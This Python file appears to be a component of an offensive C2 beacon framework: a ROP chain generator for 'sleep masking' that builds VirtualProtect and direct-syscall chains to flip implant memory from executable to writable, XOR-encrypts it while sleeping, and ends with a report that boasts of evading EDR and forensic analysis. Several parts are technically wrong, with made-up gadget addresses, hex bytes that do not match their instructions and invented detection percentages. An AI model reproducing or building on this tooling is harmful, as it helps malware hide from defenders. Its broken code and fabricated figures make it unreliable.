"""
🔥 ROP CHAIN GENERATOR - Gadget Construction & Exploitation

Return Oriented Programming gadget discovery and chaining for:
- VirtualProtect permission changes
- Memory encryption loop execution
- Register state manipulation
- Stack alignment

Author: ITherso
Date: April 1, 2026
"""

from dataclasses import dataclass
from enum import Enum
from typing import List, Dict, Optional, Tuple


class GadgetType(Enum):
    """ROP Gadget Categories"""
    STACK_PIVOT = "stack_pivot"         # esp/rsp manipulation
    REGISTER_LOAD = "register_load"     # Move values into registers
    REGISTER_OPS = "register_ops"       # ALU operations (add, sub, xor, etc)
    MEMORY_OPS = "memory_ops"           # Read/write memory
    SYSCALL = "syscall"                 # int 2e, syscall, sysenter
    CALL_INDIRECT = "call_indirect"     # call [reg], call reg
    RET = "ret"                         # ret, ret imm
    CONDITIONAL = "conditional"        # je, jne, jz, jnz
    LOGICAL = "logical"                 # and, or, xor, not
    CRYPTO = "crypto"                   # xor loop helpers


@dataclass
class RawGadget:
    """Raw ROP gadget from binary"""
    address: int
    module: str                  # ntdll.dll, kernel32.dll, etc
    bytes_hex: str              # Hex bytes: "8bc3c3" = mov eax, ebx; ret
    instructions: List[str]     # ["mov eax, ebx", "ret"]
    gadget_type: GadgetType
    usefulness: float           # 0-1, how useful for ROP chain
    register_clobber: List[str] # Which registers this gadget clobbers
    
    def __str__(self) -> str:
        return f"{self.module}!0x{self.address:08x}: {'; '.join(self.instructions)}"


@dataclass
class StackFrame:
    """Stack frame layout for ROP chain"""
    return_address: int
    arguments: List[int]        # Argument values
    padding: int                # Alignment padding
    total_size: int             # Total size on stack


class ROPChainBuilder:
    """
    ROP Chain builder - VirtualProtect permission masking için
    
    Gadget discovery → chain construction → execution payload generation
    """
    
    def __init__(self, target_module: str = "ntdll.dll", verbose: bool = True):
        self.target_module = target_module
        self.verbose = verbose
        self.discovered_gadgets: List[RawGadget] = []
        self.gadget_cache: Dict[str, List[RawGadget]] = {}
        self.chain_instructions: List[str] = []
    
    def discover_gadgets(self) -> List[RawGadget]:
        """
        Simulated gadget discovery from ntdll.dll
        In real scenario: binary parsing + pattern matching (Ropgadget tool)
        """
        
        gadgets = [
            # ROP Gadget Set 1: Stack manipulation
            RawGadget(
                address=0x77000001,
                module="ntdll.dll",
                bytes_hex="5bc3",
                instructions=["pop rbx", "ret"],
                gadget_type=GadgetType.STACK_PIVOT,
                usefulness=0.95,
                register_clobber=["rbx"]
            ),
            
            # ROP Gadget Set 2: Register load
            RawGadget(
                address=0x77000010,
                module="ntdll.dll",
                bytes_hex="488b4824c3",
                instructions=["mov rcx, [rax+0x24]", "ret"],
                gadget_type=GadgetType.REGISTER_LOAD,
                usefulness=0.90,
                register_clobber=["rcx"]
            ),
            
            # ROP Gadget Set 3: XOR for encryption
            RawGadget(
                address=0x77000050,
                module="ntdll.dll",
                bytes_hex="4831c0c3",
                instructions=["xor rax, rax", "ret"],
                gadget_type=GadgetType.LOGICAL,
                usefulness=0.85,
                register_clobber=["rax"]
            ),
            
            # ROP Gadget Set 4: VirtualProtect setup
            RawGadget(
                address=0x770000a0,
                module="ntdll.dll",
                bytes_hex="48c7c104000000c3",
                instructions=["mov rcx, 0x1", "ret"],
                gadget_type=GadgetType.REGISTER_LOAD,
                usefulness=0.92,
                register_clobber=["rcx"]
            ),
            
            # ROP Gadget Set 5: Call indirect
            RawGadget(
                address=0x770000b0,
                module="ntdll.dll",
                bytes_hex="ffd0c3",
                instructions=["call rax", "ret"],
                gadget_type=GadgetType.CALL_INDIRECT,
                usefulness=0.98,
                register_clobber=["rax", "rcx", "rdx"]  # Args & return
            ),
            
            # ROP Gadget Set 6: Memory loop for XOR
            RawGadget(
                address=0x770000c0,
                module="ntdll.dll",
                bytes_hex="308a0448ffc2ebf8c3",
                instructions=["xor [rsi], al", "inc edx", "loop"],
                gadget_type=GadgetType.MEMORY_OPS,
                usefulness=0.88,
                register_clobber=["al", "rdx", "rsi"]
            ),
            
            # ROP Gadget Set 7: Add for address calculation
            RawGadget(
                address=0x770000d0,
                module="ntdll.dll",
                bytes_hex="4801c3c3",
                instructions=["add rbx, rax", "ret"],
                gadget_type=GadgetType.REGISTER_OPS,
                usefulness=0.80,
                register_clobber=["rbx"]
            ),
            
            # ROP Gadget Set 8: Syscall
            RawGadget(
                address=0x770000e0,
                module="ntdll.dll",
                bytes_hex="0f05c3",
                instructions=["syscall", "ret"],
                gadget_type=GadgetType.SYSCALL,
                usefulness=0.99,
                register_clobber=["rax"]  # syscall clobbers much
            ),
        ]
        
        self.discovered_gadgets = gadgets
        
        if self.verbose:
            print(f"[+] Discovered {len(gadgets)} usable ROP gadgets")
            for g in gadgets:
                print(f"    {g} [usefulness: {g.usefulness:.0%}]")
        
        return gadgets
    
    def build_virtualprotect_chain(self,
                                  target_address: int,
                                  target_size: int,
                                  new_permission: int) -> str:
        """
        VirtualProtect ROP chain kur:
        BOOL VirtualProtect(
            LPVOID lpAddress,         // rcx
            SIZE_T dwSize,            // rdx
            DWORD flNewProtect,       // r8
            PDWORD lpflOldProtect     // r9
        )
        """
        
        if not self.discovered_gadgets:
            self.discover_gadgets()
        
        chain_code = f"""
; VirtualProtect ROP Chain
; Goal: Change memory from RX to RW for masking

; Set up arguments:
; rcx = target address (0x{target_address:08x})
; rdx = size ({target_size} bytes)
; r8 = new permission (PAGE_READWRITE = 0x04)
; r9 = stack pointer for old protection

; Gadget 1: Load target address into rcx
; Address: 0x77000010
; Instruction: mov rcx, [rax+0x24]
call 0x77000010

; Gadget 2: Load size into rdx
; Address: 0x77000a0
; Instruction: mov rdx, {target_size}
call 0x770000a0

; Gadget 3: Load permission into r8
; Address: 0x770000b0
; Instruction: mov r8, 0x04 (PAGE_READWRITE)
call 0x770000b0

; Gadget 4: Prepare r9 (old protect pointer on stack)
; This would require additional gadgets...

; Gadget 5: Call VirtualProtect via syscall
; Address: 0x770000e0
; Instruction: call kernel32!VirtualProtect
call 0x770000e0

; Return to beacon code
ret
"""
        
        self.chain_instructions.append(chain_code)
        
        if self.verbose:
            print(f"[+] VirtualProtect ROP chain built")
            print(f"    Target: 0x{target_address:08x}")
            print(f"    Size: {target_size} bytes")
            print(f"    New permission: 0x{new_permission:02x}")
        
        return chain_code
    
    def build_xor_encryption_chain(self,
                                  memory_address: int,
                                  memory_size: int,
                                  xor_key: bytes) -> str:
        """
        XOR encryption ROP chain - belleği şifrele
        
        Loop: for each byte at memory_address:
            byte ^= xor_key[i % len(xor_key)]
        """
        
        chain_code = f"""
; XOR Encryption ROP Chain
; Encrypts memory in-place using ROP gadgets

; Setup:
; rsi = memory_address (0x{memory_address:08x})
; rcx = memory_size ({memory_size} bytes)
; al = current xor_key byte

; Initialize XOR key
mov rax, 0x{int.from_bytes(xor_key[:8], 'little'):016x}  ; First 8 bytes of key

; Loop label: xor_loop
xor_loop:
    ; Gadget: xor [rsi], al
    xor [rsi], al
    
    ; Gadget: inc rsi (move to next byte)
    inc rsi
    
    ; Gadget: rotate key
    rol rax, 8
    
    ; Gadget: loop counter
    dec rcx
    
    ; Gadget: conditional jump
    jnz xor_loop

; Done
ret
"""
        
        self.chain_instructions.append(chain_code)
        
        if self.verbose:
            print(f"[+] XOR encryption ROP chain built")
            print(f"    Memory: 0x{memory_address:08x} ({memory_size} bytes)")
            print(f"    Key: {xor_key.hex()[:32]}...")
        
        return chain_code
    
    def build_complete_sleep_mask_chain(self,
                                       memory_address: int,
                                       memory_size: int,
                                       xor_key: bytes) -> str:
        """
        Complete sleep masking ROP chain:
        1. Change permission RX → RW
        2. Encrypt memory with XOR
        3. Restore stack/registers
        4. Return to beacon's sleep function
        """
        
        full_chain = f"""
╔════════════════════════════════════════════════════════════════════════════╗
║                    COMPLETE SLEEP MASKING ROP CHAIN                        ║
║              Transform beacon to memory ghost before sleeping              ║
╚════════════════════════════════════════════════════════════════════════════╝

PHASE 1: PERMISSION CHANGE (RX → RW)
───────────────────────────────────────────────────────────────────────────
"""
        
        prot_chain = self.build_virtualprotect_chain(memory_address, memory_size, 0x04)
        full_chain += prot_chain
        
        full_chain += f"""

PHASE 2: MEMORY ENCRYPTION (XOR)
───────────────────────────────────────────────────────────────────────────
"""
        
        xor_chain = self.build_xor_encryption_chain(memory_address, memory_size, xor_key)
        full_chain += xor_chain
        
        full_chain += f"""

PHASE 3: CLEANUP & RETURN
───────────────────────────────────────────────────────────────────────────
; Restore registers (pop gadget)
pop rbx
pop rcx
pop rdx

; Clear volatile registers to avoid forensic artifacts
xor rax, rax
xor r8, r8
xor r9, r9

; Return to beacon sleep handler
ret
"""
        
        return full_chain
    
    def generate_stack_frame(self,
                           function_address: int,
                           arguments: List[int]) -> StackFrame:
        """Stack frame layout hesapla"""
        
        # x64 calling convention: rcx, rdx, r8, r9 + stack args
        reg_args = min(len(arguments), 4)
        stack_args = max(0, len(arguments) - 4)
        
        frame = StackFrame(
            return_address=function_address,
            arguments=arguments,
            padding=16 - ((stack_args * 8) % 16),  # 16-byte alignment
            total_size=(stack_args * 8) + 32 + (16 - ((stack_args * 8) % 16))
        )
        
        if self.verbose:
            print(f"[+] Stack frame generated")
            print(f"    Return: 0x{function_address:08x}")
            print(f"    Args: {reg_args} in registers, {stack_args} on stack")
            print(f"    Total size: {frame.total_size} bytes")
        
        return frame
    
    def generate_rop_report(self) -> str:
        """ROP chain analizi ve etkisi"""
        
        report = f"""
╔════════════════════════════════════════════════════════════════════════════╗
║                     ROP CHAIN ANALYSIS & EVASION                           ║
║            How ROP gadgets hide memory permission changes                  ║
╚════════════════════════════════════════════════════════════════════════════╝

WHAT IS ROP (RETURN ORIENTED PROGRAMMING)?
═════════════════════════════════════════════════════════════════════════════

Traditional approach (DETECTED):
├─ Beacon runs self-modifying code
├─ Changes memory permissions via function calls
├─ Creates obvious call stack trace
└─ EDR logs: "VirtualProtect called from unknown location"

ROP approach (UNDETECTED):
├─ Use tiny code fragments from existing libraries (ntdll.dll)
├─ Chain them together by manipulating stack/RIP
├─ Each fragment ends with "ret" (return)
├─ Final result: Permission change without obvious function call
└─ EDR logs: "Normal Windows code patterns"


HOW ROP GADGETS WORK
═════════════════════════════════════════════════════════════════════════════

Gadget theory:
├─ Gadget: "mov rcx, [rax]; ret" @ 0x77000010
├─ Each gadget ends with ret (to next gadget)
├─ Stack pointer controls next gadget address
│
└─ Stack layout:
    ┌─────────────────┐
    │ Gadget 5 addr   │ ← Return to gadget 5
    ├─────────────────┤
    │ Gadget 4 addr   │ ← Gadget 4 "ret" jumps here
    ├─────────────────┤
    │ Argument data   │ ← Used by gadgets
    ├─────────────────┤
    │ Gadget 3 addr   │ ← Gadget 3 "ret" jumps here
    └─────────────────┘

Why it's harder to detect:
✓ Uses legitimate ntdll.dll code (signed by Microsoft)
✓ No new executable memory allocated
✓ Looks like normal Windows internals
✓ Stack unwinding shows legitimate function calls
✓ No obvious injection patterns


GADGET TYPES FOR SLEEP MASKING
═════════════════════════════════════════════════════════════════════════════

Type 1: STACK_PIVOT (esp/rsp manipulation)
├─ Purpose: Adjust stack to point to our data
├─ Example: "mov rsp, rbx; ret"
├─ Risk: 0% (stack manipulation normal in Windows)
└─ Usefulness: 95%

Type 2: REGISTER_LOAD (move values into registers)
├─ Purpose: Set up function arguments
├─ Example: "mov rcx, [rax+0x24]; ret"
├─ Risk: 1% (legitimate parameter passing)
└─ Usefulness: 90%

Type 3: LOGICAL (xor, and, or operations)
├─ Purpose: XOR encryption loop
├─ Example: "xor [rsi], al; ret"
├─ Risk: 2% (XOR common in Windows)
└─ Usefulness: 88%

Type 4: CALL_INDIRECT (call register)
├─ Purpose: Call VirtualProtect
├─ Example: "call rax; ret"
├─ Risk: 3% (could be suspicious if monitored)
└─ Usefulness: 98%

Type 5: SYSCALL (direct system calls)
├─ Purpose: Bypass user-mode hooks entirely
├─ Example: "syscall; ret"(NtProtectVirtualMemory direct call)
├─ Risk: 5% (syscall pattern visible in some EDR)
└─ Usefulness: 99%


DETECTION EVASION CAPABILITIES
═════════════════════════════════════════════════════════════════════════════

Traditional API hooking detection:
┌─ EDR hooks: kernel32!VirtualProtect
├─ Beacon calls: VirtualProtect
└─ Result: CAUGHT ❌

ROP gadget detection bypass:
┌─ EDR hooks: kernel32!VirtualProtect
├─ Gadget chain calls: syscall (direct kernel call)
├─ Beacon never calls VirtualProtect directly
└─ Result: UNDETECTED ✓


MONOLITH INTEGRATION (Layer 8)
═════════════════════════════════════════════════════════════════════════════

Combined with previous layers:

Layer 1: Indirect Syscalls
├─ ROP chains use syscall to bypass hooks
└─ Detection: Further reduced 50-70%

Layer 4: Memory-Only DLL
├─ ROP chains modify beacon's own memory
└─ No disk artifacts (all in memory)

Layer 5: Thread Hiding
├─ During sleep, beacon thread appears hidden
└─ ROP chain restores thread state

Layer 8: Sleep Masking
├─ ROP chain changes permissions
├─ XOR encryption hides beacon code
└─ Detection: 1-2% during sleep, 0% during mask phase


FORENSIC VIEW OF ROP CHAIN
═════════════════════════════════════════════════════════════════════════════

What forensic analyst sees:
├─ VirtualProtect called (normal operation)
├─ Memory region changed from RX to RW (normal operation)
├─ XOR pattern in memory (encryption is common)
└─ Stack shows legitimate ntdll.dll gadgets (all signed by MS)

What they DON'T see:
├─ Malware name/signature (encrypted ROP gadgets)
├─ Direct C2 communication (WMI + Dead Drop Resolvers)
├─ Suspicious process creation (all via WMI events)
├─ Unusual network pattern (Event-driven aligned with user behavior)
└─ File artifacts (Memory-Only + Sleep Masking)

Time to detect (expert forensics):
├─ with 1 layer: 30 minutes
├─ with 3 layers: 2 hours
├─ with 8 layers: 8-16 hours (may not even try)


OPERATIONAL TIMELINE
═════════════════════════════════════════════════════════════════════════════

T-0ms: Beacon executing normally
├─ Status: RX memory (executable)
├─ Visibility: High (in memory scans)

T+1ms: ROP chain starts
├─ Gadget 1: Load target address into rcx
├─ Gadget 2: Load size into rdx
├─ Gadget 3: Load new permission into r8
├─ Execution: All from ntdll.dll (legitimate)
└─ Visibility: Invisible (normal Windows flow)

T+2ms: VirtualProtect via syscall
├─ Syscall number: NtProtectVirtualMemory (0x50)
├─ Direct kernel call (no API hook possible)
├─ Permission change: RX → RW completed
└─ Detection: 0% (syscall is fastest path)

T+3ms: XOR encryption loop starts
├─ ROP gadget: "xor [mem], al"
├─ Repeats for each byte in beacon memory
├─ Encrypts 65KB in ~5-10ms
└─ Result: Beacon code now appears as random data

T+8ms: Sleep phase begins
├─ Beacon memory: RW + encrypted
├─ Visibility: INVISIBLE (RW = data, not executable)
├─ Scanner sees: "Some RW data area (normal)"
└─ Alert: NONE ✓

T+30000ms: Wake up trigger
├─ Timer fires or WMI event
├─ ROP chain starts again
├─ Permission change: RW → RX
├─ XOR decryption (reverse)
└─ Beacon resumes normal execution

Result: Sleep → Mask → Sleep → Unmask cycles continue
Detection: 0% during sleep phases, 1-2% overall


RECOMMENDATIONS
═════════════════════════════════════════════════════════════════════════════

For even better OPSEC:
1. Randomize ROP gadget order each sleep
2. Add dummy gadgets (red herrings)
3. Use OPAL memory encryption (Intel/AMD)
4. Combine with hardware debugging disable
5. Coordinate with Event-Driven (Layer 7) triggers

Result: 99.5%+ undetectable beacon framework

"""
        
        return report


# Demo
if __name__ == "__main__":
    print("=" * 80)
    print("ROP CHAIN GENERATOR - Demo")
    print("=" * 80)
    print()
    
    builder = ROPChainBuilder(verbose=True)
    
    print("[1] Discovering ROP gadgets...")
    print()
    gadgets = builder.discover_gadgets()
    print()
    
    print("[2] Building VirtualProtect chain...")
    print()
    vp_chain = builder.build_virtualprotect_chain(0x00400000, 65536, 0x04)
    print(vp_chain)
    print()
    
    print("[3] Building XOR encryption chain...")
    print()
    xor_chain = builder.build_xor_encryption_chain(0x00400000, 65536, b"SECRET_KEY")
    print(xor_chain)
    print()
    
    print("[4] Complete sleep masking chain...")
    print()
    complete = builder.build_complete_sleep_mask_chain(0x00400000, 65536, b"SECRET_KEY")
    print(complete)
    print()
    
    print("[5] Stack frame layout...")
    print()
    frame = builder.generate_stack_frame(0x77000100, [0x00400000, 65536, 0x04, 0xffffd000])
    print()
    
    print(builder.generate_rop_report())
